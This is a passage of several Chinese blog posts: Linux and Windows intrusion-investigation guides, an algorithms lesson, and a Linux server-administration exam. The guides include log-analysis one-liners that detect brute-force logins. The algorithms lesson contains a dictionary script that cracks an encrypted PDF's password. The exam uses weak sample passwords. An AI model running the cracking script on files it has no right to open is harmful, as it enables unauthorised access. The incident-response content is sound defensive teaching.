删除每个用户cront任务(谨慎：删除所有的计划任务) crontab -e 使用编辑器编辑当前的crontab文件 如：*/1 * * * * echo \"hello world\" &gt;&gt; /tmp/test.txt 每分钟写入文件 2、利用 anacron 命令实现异步定时任务调度 使用案例 每天运行 /home/backup.sh 脚本： vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh 当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。 入侵排查 重点关注以下目录中是否存在恶意脚本 /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* 小技巧： more /etc/cron.daily/* 查看目录下所有文件 1.7 检查服务服务自启动 第一种修改方法： chkconfig [--level 运行级别] [独立服务名] [on|off] chkconfig –level 2345 httpd on 开启自启动 chkconfig httpd on （默认level是2345） 第二种修改方法： 修改 /etc/re.d/rc.local 文件 加入 /etc/init.d/httpd start 第三种修改方法： 使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。 入侵排查 1、查询已安装的服务： RPM 包安装的服务 chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务 ps aux | grep crond 查看当前服务 系统在3与5级别下的启动项 中文环境 chkconfig --list | grep \"3:启用\\|5:启用\" 英文环境 chkconfig --list | grep \"3:on\\|5:on\" 源码包安装的服务 查看服务安装位置 ，一般是在/user/local/ service httpd start 搜索/etc/rc.d/init.d/ 查看是否存在 1.8 检查异常文件1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性 2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？ ​ 可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件 3、针对可疑文件可以使用 stat 进行创建修改时间。 1.9 检查系统日志日志默认存放位置：/var/log/ 查看日志配置情况：more /etc/rsyslog.conf 日志文件 说明 /var/log/cron 记录了系统定时任务相关的日志 /var/log/cups 记录打印信息的日志 /var/log/dmesg 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 /var/log/mailog 记录邮件信息 /var/log/message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 /var/log/btmp 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看 /var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看 /var/log/utmp 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询 /var/log/secure 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 日志分析技巧： 1、定位有多少IP在爆破主机的root帐号： grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破： grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c 爆破用户名字典是什么？ grep \"Failed password\" /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP： grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志： Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4、删除用户kali日志： Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5、su切换用户： Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo授权执行: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 0x02 工具篇2.1 Rootkit查杀 chkrootkit 网址：http://www.chkrootkit.org 使用方法： wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar zxvf chkrootkit.tar.gz cd chkrootkit-0.52 make sense #编译完成没有报错的话执行检查 ./chkrootkit rkhunter 网址：http://rkhunter.sourceforge.net 使用方法： Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar -zxvf rkhunter-1.4.4.tar.gz cd rkhunter-1.4.4 ./installer.sh --install rkhunter -c 2.2 病毒查杀 Clamav 网址：http://www.clamav.net/download.html 安装方式一： 1、安装 zlib： wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gz cd zlib-1.2.7 #安装一下gcc编译环境： yum install gcc CFLAGS=\"-O3 -fPIC\" ./configure --prefix= /usr/local/zlib/ make &amp;&amp; make install 2、添加用户组 clamav 和组成员 clamav： groupadd clamav useradd -g clamav -s /bin/false -c \"Clam AntiVirus\" clamav 3、安装 Clamav tar –zxvf clamav-0.97.6.tar.gz cd clamav-0.97.6 ./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib make make install 4、配置 Clamav mkdir /opt/clamav/logs mkdir /opt/clamav/updata touch /opt/clamav/logs/freshclam.log touch /opt/clamav/logs/clamd.log cd /opt/clamav/logs chown clamav:clamav clamd.log chown clamav:clamav freshclam.log 5、ClamAV 使用： /opt/clamav/bin/freshclam 升级病毒库 ./clamscan –h 查看相应的帮助信息 ./clamscan -r /home 扫描所有用户的主目录就使用 ./clamscan -r --bell -i /bin 扫描bin目录并且显示有问题的文件的扫描结果 安装方式二： #安装 yum install -y clamav #更新病毒库 freshclam #扫描方法 clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log #扫描并杀毒 clamscan -r --remove /usr/bin/bsd-port clamscan -r --remove /usr/bin/ clamscan -r --remove /usr/local/zabbix/sbin #查看日志发现 cat /root/usrclamav.log |grep FOUND 2.3 webshell查杀Linux 版： 河马 WebShell 查杀：http://www.shellpub.com 2.4 RPM check 检查系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了： ./rpm -Va &gt; rpm.log 如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。 验证内容中的8个信息的具体内容如下： S 文件大小是否改变 M 文件的类型或文件的权限（rwx）是否被改变 5 文件MD5校验是否改变（可以看成文件内容是否改变） D 设备中，从代码是否改变 L 文件路径是否改变 U 文件的属主（所有者）是否改变 G 文件的属组是否改变 T 文件的修改时间是否改变 如果命令被替换了，如果还原回来： 文件提取还原案例： rpm -qf /bin/ls 查询 ls 命令属于哪个软件包 mv /bin/ls /tmp 先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象 rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下 cp /root/bin/ls /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失 2.5 Linux安全检查脚本Github 项目地址： https://github.com/grayddq/GScan https://github.com/ppabc/security_check https://github.com/T0xst/linux 尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。","categories":[],"tags":[{"name":"入侵排查篇","slug":"入侵排查篇","permalink":"http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"}]},{"title":"第1篇：Windows 入侵排查","slug":"第1篇：Windows-入侵排查","date":"2021-07-14T01:04:15.000Z","updated":"2021-09-20T08:47:43.807Z","comments":true,"path":"posts/c4440d4e.html","link":"","permalink":"http://www.xiaocaibi.top/posts/c4440d4e.html","excerpt":"","text":"第1篇：windows 入侵排查0x00 前言当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。 常见的应急响应事件分类： Web 入侵：网页挂马、主页篡改、Webshell 系统入侵：病毒木马、勒索软件、远控后门 网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗 针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。 0x01 入侵排查思路1.1 检查系统账号安全1、查看服务器是否有弱口令，远程管理端口是否对公网开放。 检查方法：据实际情况咨询相关服务器管理员。 2、查看服务器是否存在可疑账号、新增账号。 检查方法：打开 cmd 窗口，输入 lusrmgr.msc 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 3、查看服务器是否存在隐藏账号、克隆账号。 检查方法： a、打开注册表 ，查看管理员对应键值。 b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。 4、结合日志，查看管理员登录时间、用户名是否存在异常。 检查方法： a、Win+R 打开运行，输入”eventvwr.msc”，回车运行，打开“事件查看器”。 b、导出 Windows 日志 – 安全，利用微软官方工具 Log Parser 进行分析。 ) 1.2 检查异常端口、进程1、检查端口连接情况，是否有远程连接、可疑连接。 检查方法： a、使用netstat -ano 命令查看目前的网络连接，定位可疑的 ESTABLISHED b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 tasklist | findstr \"PID\" 2、进程 检查方法： a、开始 – 运行 – 输入 msinfo32 命令，依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。 b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。 c、通过微软官方提供的 Process Explorer 等工具进行排查 。 d、查看可疑的进程及其子进程。可以通过观察以下内容： 没有签名验证信息的进程 没有描述信息的进程 进程的属主 进程的路径是否合法 CPU 或内存资源占用长时间过高的进程 3、小技巧： ​ a、查看端口对应的 PID：netstat -ano | findstr \"port\" ​ b、查看进程对应的 PID：任务管理器 – 查看 – 选择列 – PID 或者 tasklist | findstr \"PID\" ​ c、查看进程对应的程序位置： ​ 任务管理器 – 选择对应进程 – 右键打开文件位置 ​ 运行输入 wmic，cmd 界面输入 process ​ d、tasklist /svc 进程 – PID – 服务 ​ e、查看Windows服务所对应的端口： ​ %systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\\Windows 路径） 1.3 检查启动项、计划任务、服务1、检查服务器是否有异常的启动项。 检查方法： a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。b、单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项： HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce 检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。 d、利用安全软件查看启动项、开机时间管理等。 e、组策略，运行 gpedit.msc 2、检查计划任务 检查方法： a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。 b、单击【开始】&gt;【运行】；输入 cmd，然后输入 at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。 3、服务自启动 检查方法：单击【开始】&gt;【运行】，输入 services.msc，注意服务状态和启动类型，检查是否有异常服务。 1.4 检查系统相关信息1、查看系统版本以及补丁信息 检查方法：单击【开始】&gt;【运行】，输入 systeminfo，查看系统信息。 2、查找可疑目录及文件 检查方法： a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。 Window 2003版本 C:\\Documents and Settings Window 2008R2及以后版本 C:\\Users\\ b、单击【开始】&gt;【运行】，输入 %UserProfile%\\Recent，分析最近打开分析可疑文件。 c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。 d、回收站、浏览器下载目录、浏览器历史记录 e、修改时间在创建时间之前的为可疑文件 3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？ a、利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。b、利用计算机自带文件搜索功能，指定修改时间进行搜索。 1.5 自动化查杀 病毒查杀 检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。 webshell查杀 检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。 1.6 日志分析系统日志 分析方法： a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。 b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开”事件查看器”。 C、导出应用程序日志、安全日志、系统日志，利用 Log Parser 进行分析。 Web 访问日志 分析方法： a、找到中间件的web日志，打包到本地方便进行分析。 b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。 0x02 工具篇2.1 病毒分析PCHunter：http://www.xuetr.com 火绒剑：https://www.huorong.cn Process Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhacker：https://processhacker.sourceforge.io/downloads.php autoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTL：https://www.bleepingcomputer.com/download/otl/ SysInspector：http://download.eset.com.cn/download/detail/?product=sysinspector 2.2 病毒查杀卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe （推荐理由：绿色版、最新病毒库） 大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库） 火绒安全软件：https://www.huorong.cn 360杀毒：http://sd.360.cn/download_center.html 2.3 病毒动态CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn 微步在线威胁情报社区：https://x.threatbook.cn 火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html 爱毒霸社区：http://bbs.duba.net 腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html 2.4 在线病毒扫描网站Virustotal：https://www.virustotal.com Virscan：http://www.virscan.org 腾讯哈勃分析系统：https://habo.qq.com Jotti 恶意软件扫描系统：https://virusscan.jotti.org 2.5 webshell查杀D盾_Web查杀：http://www.d99net.net/index.asp 河马 WebShell 查杀：http://www.shellpub.com","categories":[{"name":"入侵排查篇","slug":"入侵排查篇","permalink":"http://www.xiaocaibi.top/categories/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"}],"tags":[{"name":"入侵排查篇","slug":"入侵排查篇","permalink":"http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"}]},{"title":"算法入门系列课程1","slug":"算法入门系列课程1","date":"2021-07-12T04:25:43.000Z","updated":"2021-09-20T08:47:43.869Z","comments":true,"path":"posts/3086a710.html","link":"","permalink":"http://www.xiaocaibi.top/posts/3086a710.html","excerpt":"","text":"算法入门系列课程1 - 周而复始算法概述 什么是算法？ 解决问题的正确方法和具体的实施步骤。 例子1：如何在两栋相距50m的大楼的两个房间牵一条线（两个房间都有窗）？ 养一只鸟（如鸽子），将线送过去 用很长的杆子将线递过去 用无人机（遥控飞行器）将线送过去 如何评价这些方法的好坏？少花钱，不费事！ 例子2：大教室里坐了几百名学生一起听课，如何快速的统计学生人数？ 例子3：向列表容器中逆向插入100000个元素。 方法1： nums = [] for i in range(100000): nums.append(i) nums.reverse() 方法2： nums = [] for i in range(100000): nums.insert(0, i) 例子3：生成Fibonacci数列（前100个Fibonacci数）。 方法1 - 递推： a, b = 0, 1 for num in range(1, 101): a, b = b, a + b print(f'{num}: {a}') 方法2 - 递归： def fib(num): if num in (1, 2): return 1 return fib(num - 1) + fib(num - 2) for num in range(1, 101): print(f'{num}: {fib(num)}') 方法3 - 改进的递归： def fib(num, temp={}): if num in (1, 2): return 1 elif num not in temp: temp[num] = fib(num - 1) + fib(num - 2) return temp[num] 方法4 - 改进的递归： from functools import lru_cache @lru_cache() def fib(num): if num in (1, 2): return 1 return fib(num - 1) + fib(num - 2) 如何评价算法的好坏？ 渐近时间复杂度和渐近空间复杂度。 大**O**符号的意义？ 表示一个函数相对于输入规模的增长速度，也可以称之为函数的数量级。 大O符号 说明 例子 $$O(c)$$ 常量时间复杂度 布隆过滤器 / 哈希存储 $$O(log_2n)$$ 对数时间复杂度 二分查找（折半查找） $$O(n)$$ 线性时间复杂度 顺序查找 / 桶排序 $$O(n*log_2n)$$ 对数线性时间复杂度 高级排序算法（归并排序、快速排序） $$O(n^2)$$ 平方时间复杂度 简单排序算法（选择排序、插入排序、冒泡排序） $$O(n^3)$$ 立方时间复杂度 Floyd算法 / 矩阵乘法运算 $$O(2^n)$$ 几何级数时间复杂度 汉诺塔 $$O(n!)$$ 阶乘时间复杂度 旅行经销商问题 穷举法在计算机科学中，穷举法或者暴力搜索法是一个非常非常直观的解决问题的方法，这种方法通过一项一项的列举解决方案所有可能的候选项以及检查每个候选项是否符合问题的描述，最终得到问题的解。 虽然暴力搜索很容易实现，并且如果解决方案存在它就一定能够找到，但是它的代价是和候选方案的数量成比例的，由于这一点，在很多实际问题中，消耗的代价会随着问题规模的增加而快速地增长。因此，当问题规模有限或当存在可用于将候选解决方案的集合减少到可管理大小时，就可以使用暴力搜索。另外，当实现方法的简单度比速度更重要的时候，也可以考虑使用这种方法。 经典例子 百钱百鸡问题：公鸡5元一只，母鸡3元一只，小鸡1元三只，用100元买一百只鸡，问公鸡、母鸡、小鸡各有多少只？ for x in range(21): for y in range(34): z = 100 - x - y if z % 3 == 0 and 5 * x + 3 * y + z // 3 == 100: print(x, y, z) 五人分鱼问题：ABCDE五人在某天夜里合伙捕鱼，最后疲惫不堪各自睡觉。第二天A第一个醒来，他将鱼分为5份，扔掉多余的1条，拿走了属于自己的一份；B第二个醒来，也将鱼分为5份，扔掉多余的1条，拿走属于自己的一份；然后C、D、E依次醒来，也按同样的方式分鱼，问他们至少捕了多少条鱼？ fish = 6 while True: total = fish enough = True for _ in range(5): if (total - 1) % 5 == 0: total = (total - 1) // 5 * 4 else: enough = False break if enough: print(fish) break fish += 5 暴力破解口令： import re import PyPDF2 with open('Python_Tricks_encrypted.pdf', 'rb') as pdf_file_stream: reader = PyPDF2.PdfFileReader(pdf_file_stream) with open('dictionary.txt', 'r') as txt_file_stream: file_iter = iter(lambda: txt_file_stream.readline(), '') for word in file_iter: word = re.sub(r'\\s', '', word) if reader.decrypt(word): print(word) break","categories":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"期末考试","slug":"期末考试","date":"2021-06-30T15:17:41.000Z","updated":"2021-07-01T00:46:52.312Z","comments":true,"path":"posts/undefined.html","link":"","permalink":"http://www.xiaocaibi.top/posts/undefined.html","excerpt":"","text":"2020年-2021年第二学期Linux网络操作系统期末考试题总分（100分）学号：姓名：班级专业： 说明:本试卷为期末考试题,为电子试卷电子交卷,请将试卷名称命名为”学号+姓名.doc”,如学号20101101,姓名张三,则考卷命名为”20101101张三.doc”,请考生准确在试卷上填写个人信息,请按照一下题目要求完成,在需要截图的位置放置截图,考试卷中所有出现的均为班号后两位，均为学号的后三位如001，Z均为姓名的首字母拼音如zs。 新建一台centos7的虚拟机，参数如下： 虚拟机名：centos7server 硬盘大小：500G 内存大小：2048M 光驱：有，放入centos7.iso光盘 软驱：无 网卡地址：00-00-XX-XX-XY- 虚拟机的网络：NAT网络，关闭DHCP服务。 请在计算机中找到centos7.iso光盘的位置 截图要求（包含以上参数的虚拟机配置） 2、安装一台centos7的计算机，要求如下：（10分）（1）硬盘分区： /boot xfs 200M / xfs 200G Swap swap 大小根据公式计算截图要求（安装过程分区图）： （2）安装要求：安装包，全部默认安装图形桌面系统安装即可截图要求（选择默认安装）： （3）系统设置要求： IP地址：192.168.. 子网掩码:255.255.255.0 网关：192.168..254 DNS：192.168.. 计算机名：serverZ.jsj.com 截图要求（网络配置）： 时区：东八区上海、使用UTC时间 截图要求（时间配置）： （4）服务器首次配置超级用户密码：redhat时间配置：当日的时间截图要求（时间配置）： 3、基本命令（5分） （1）请用命令显示计算机名 （2）用命令显示计算机的IP地址 （3）用命令显示2016年1月的月历 （4）用命令显示当前用户的UID （5）显示当前系统日期和时间。 截图要求（填写命令名称和参数并截图）： 4、系统的基本管理（15分） （1）创建一个组ID为的用户组staff （2）创建两个用户1和2 （3）修改两个用户的密码为RedHat123 （4）将1添加到staff组中 截图要求（查看/etc/passwd,/etc/group文件相关内容 （5）在1用户家目录下创建两个个文件夹web1，web2，在根目录下创建两个文件夹share1，share2 （6）在web1中创建六个文件index1.html,index 2.html,index3.html和jsjnet1.txt,jsjnet2.txt,jsjnet3.txt 内容如下： index1.html: Welcome to Z Web1!!! index2.html: Welcome to Z Web2!!! index3.html: Welcome to Z Web3!!! jsjnet1.txt: This is a text jsjnet1! jsjnet2.txt: This is a text jsjnet2! jsjnet3.txt: This is a text jsjnet3! （7）将index1.html从原文件夹复制并更名为index1.html.bak （8）将index1.html删除 （9）将index3.html重命名为index.html (10) 将index2.html移动到web2文件夹，并命名为index.html 截图要求（cat分别查看文件内容，查看家目录，web1,web2文件夹内的内容） （11）复制jsjnet1.txt,jsjnet2.txt到share1中 （12）移动jsjnet3.txt到share1中更名为testYXX3.txt （13）用root账户移动share1到share2到目录下 截图要求（查看根目录，share1中的长文件内容） (14)修改web2的属组为staff，属于的用户为2 (15)修改web1及其中的文件的属组和用户均为root https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg\" data-original=\" (16)修改web1及其中的文件权限为u,g,o组均为读写可执行。 https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg\" data-original=\"（17）修改share1和share2的用户和属组为root https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg\" data-original=\" (18)修改share2的权限为777 截图要求（用命令查看家目录、Web1和根目录的全部目录信息）： 5、系统与服务的基本配置（60分） （1）网络基本配置 （5分）修改系统网络为IP地址为192.X.XX.10 255.255.255.0 192.X.XX.254DNS:192.X.XX.10， 请关闭系统防火墙，设置selinux为disabled。 vim /etc/selinux/config 将enforcing 改disabled 修改计算机名为：serverZ.jsjnet.com 配置系统的Yum仓库为光盘：使用yum repolist进行检查 (1)创建一个挂载点 进入 在yum.repos.d里面创建一个备份的文件夹 将里面所有repo的文件全部移动到backup文件夹 然后使用vim cdrom.repo配置挂载点 [cdrom] name=iso baseurl=file:///mnt/cdrom enabled=1 gpgche=0 ） 然后使用motun 挂载 挂载完后,我们装一个vim 测试一下是否配置成功 这样就配置完了截图要求（适当截取命令或配置文件均可）： （2）磁盘管理（5分）请为操作系统添加一块硬盘 将硬盘分为 /dev/sdb1，2G，格式化为ext4分区，开机自动挂载到/opt/data目录下截图要求（适当截取命令或配置文件均可）： 1.使用fdisk -l 查看刚才添加的硬盘 2.然后在这里可以看到这是我们刚才添加的5g硬盘 3.我们使用.fdisk /dev/sdb 4.这里输入n,输入p,w 5.然后我们对硬盘进行格式化 6.创建一个挂载点 进入vim /etc/fstab对硬盘设置开机自动挂载 使用df -hT查看 （3）DNS （10分） 1）安装DNS服务器 2）配置DNS服务器，在本机配置一个DNS域为jsjnet.com，完成Z.jsnet.com，web1.jsjnet.com，web2.jsjnet.com，ftp.jsjnet.com，bbs.jsjnet.com五个域名的正反向解析，解析Ip全部为本机IP。截图要求：截取DNS主文件配置内容，DNS辅助配置文件的内容，通过nslookup，dig或Ping测试所有的域名结果 dns配置: 安装dns服务 启动named服务 查看dns服务器是否开启 开启dns服务,重新加载防火墙配置 进入 vim /etc/named.conf主配置文件 将这两个改成any,开放53端口,允许所有人访问 配置完然后保存退出 然后进入区域配置文件vim /etc/named.rfc1912.zoens zone \"localhost\" IN { type master; file \"named.localhost\"; allow-update { none; }; }; 正向解析:将这段复制下来,5yy复制,然后GG跳到最后一行,按p粘贴,然后配置正向解析 zone \"jsjnet.com\" IN { type master; file \"jsjnet.com.zoen\"; allow-update { none; }; }; 反向解析: zone \"0.in-addr.arpa\" IN { type master; file \"named.empty\"; allow-update { none; }; }; 将这段复制下来,5yy复制,然后GG跳到最后一行,按p粘贴,然后配置反向解析 zone \"8.168.192.in-addr.arpa\" IN { type master; file \"jsjnet.com.loopback\"; allow-update { none; }; }; 进入cd /var/named cp -p named.localhost jsjnet.com.zoen 复制一份改成jsjnet.com.zoen cp -p named.loopback jsjnet.com.loopback 复制一份jsjnet.com.loopback 然后进入正向区域配置文件添加指针vim jsjnet.com.zoen 然后进入反向区域配置文件添加指针vim jsjnet.com.loopback 然后重新加载 测试 （4）Web （15分） 1)安装Apache服务器 2)启动Apache服务器，并设置为永久启动 3)复制Web1的内容到/var/www/web1，/var/www/web1port8080下 4)复制Web2的内容到/var/www/web2，/var/www/web1port8080下 5)配置站点http://web1.jsjnet.com和http://web2.jsjnet.com 6)配置站点http://web1.jsjnet.com:8080和http://web2.jsjnet.com:8080 截图要求（安装启动过程，在本机上访问四个网址）： （5）Mysql（10分）= mariadb 1）安装mysql服务器和客户端 2）配置root数据库管理员密码为123456 3）创建新数据库exam，创建新用户user1，使新用户user1对于数据库具有所有权限。 mysql_secure_installation mysql -u root -p create database exam; CREATE USER user1 IDENTIFIED BY ‘123456’; GRANT ALL ON exam.* TO ‘user1’@’localhost’ IDENTIFIED BY WITH GRANT OPTION; flush privileges; use exam; create table course(id int(4),cname char(20)); insert into exam.course values (1, ‘Linux’); 4）建立数据表course，name和score表结构如下： course id cname 1 Linux 2 Windows 3 PHP name id name 1 pig 2 duck 3 monkey score id cname name score 1 Linux pig 90 2 Linux duck 90 3 Linux monkey 90 4 windows pig 90 5 windows duck 90 截图查询数据库，表信息，并验证权限的信息；截图备份所有数据到backup文件的信息。 备份数据库 恢复数据库 检查恢复情况 （6）配置DHCP服务（10分） 1)为虚拟机添加一块网卡使用仅主机连接，重启计算机，为计算机配置网卡为，IP地址为192.X.XX.10 2)配置一个DHCP服务器，地址池为192.X.XX.100-192.X.XX.200，网关为192.X.XX.254，DNS为192.X.XX.10 3)编辑/etc/sysctl.conf文件，确定里面有net.ipv4.ip_forward=1,执行sysctl -p 4)使用Windows系统中的Vmware NAT 网卡自动获取正确的IP地址截图获取地址的信息图片，在WindowsDHCP客户端中访问以上Web题目中访问配置的几个域名网站的截图。 （7）配置文件共享服务（10分） 1）配置一个vsftpd服务，把/etc/hosts文件复制到/var/ftp/目录下，使客户端可以下载并查看该文件。 2）配置一个Samba服务，将/home/database文件夹共享给Z用户，密码为redhat，共享名为database，使Windows可以访问并上传文件 3）配置一个NFS服务，将/nfs/share1和/nfs/share2文件夹共享给客户端，使客户端可以挂载两个文件夹，实现对share2文件夹的读写功能。 截图要求：网页打开ftp共享的文件内容截图，windows查看文件共享并建立一个test 文件截图，NFS客户端df查看，挂载后写入文件查看截图。 #附加题（10分）： （8）通过以上所有服务器的基本配置后，升级网站系统，将Discuz3.3的论坛系统，部署到LAMP架构下，并能够访问主站。截图要求：访问http://bbs.jsjnet.com网站查看论坛截图，并正确登陆后台进行截图。","categories":[],"tags":[{"name":"linun","slug":"linun","permalink":"http://www.xiaocaibi.top/tags/linun/"}]},{"title":"65.解析动态内容","slug":"65-解析动态内容","date":"2021-06-27T06:39:00.000Z","updated":"2021-09-20T08:47:43.775Z","comments":true,"path":"posts/d0573169.html","link":"","permalink":"http://www.xiaocaibi.top/posts/d0573169.html","excerpt":"","text":"解析动态内容根据权威机构发布的全球互联网可访问性审计报告，全球约有四分之三的网站其内容或部分内容是通过JavaScript动态生成的，这就意味着在浏览器窗口中“查看网页源代码”时无法在HTML代码中找到这些内容，也就是说我们之前用的抓取数据的方式无法正常运转了。解决这样的问题基本上有两种方案，一是JavaScript逆向工程；另一种是渲染JavaScript获得渲染后的内容。 